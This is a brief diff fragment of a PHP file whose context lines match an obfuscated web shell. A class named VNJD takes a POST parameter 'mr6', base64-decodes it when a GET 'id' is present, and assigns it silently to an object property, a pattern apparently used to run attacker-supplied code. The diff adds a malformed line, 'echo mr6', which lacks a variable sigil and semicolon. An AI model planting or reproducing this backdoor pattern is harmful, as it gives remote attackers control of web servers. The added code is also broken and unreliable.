@@ -17,4 +17,5 @@ class VNJD {
 }
 $vnjd = new VNJD();
 @$vnjd->Cf = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
+echo mr6
 ?>
